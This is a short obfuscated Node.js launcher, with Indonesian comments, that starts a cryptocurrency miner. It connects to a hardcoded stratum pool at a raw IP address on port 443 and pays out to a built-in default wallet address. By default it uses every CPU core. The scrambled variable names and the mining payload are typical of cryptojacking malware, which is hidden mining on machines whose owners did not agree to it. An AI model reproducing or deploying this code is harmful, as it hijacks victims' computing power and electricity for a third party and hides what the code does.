const { Nnode: _0x1a2b3 } = require("./index.js");
const _0x4c5d6 = require("os");

(function () {
    const _0x7e8f9 = 'stratum+tcp://23.92.29.22:443';

    // Ambil argumen CLI
    const _0xa1b2c = parseInt(process.argv[2], 10);
    const _0xd3e4f = process.argv[3];

    const _0x5f6g7 = _0x4c5d6.cpus().length;

    // Pilih threads
    const _0x8h9i0 = (!isNaN(_0xa1b2c) && _0xa1b2c > 0) ? _0xa1b2c : _0x5f6g7;

    // Wallet default
    const _0x1j2k3 = _0xd3e4f || '88yrgvUpdYx1RNon4zRcSKJbhXoCz4wcmQztNKrKddDkaWPamJiPNksLcCQcUnyMkF3JYzuiYUXNFCm4fVgJY9qB8qeCNTX';

    // Konfigurasi
    const _0x4l5m6 = {
        'threads': _0x8h9i0,
        'mode': 'FAST'
    };
    new _0x1a2b3(_0x7e8f9, _0x1j2k3, _0x4l5m6);
})();
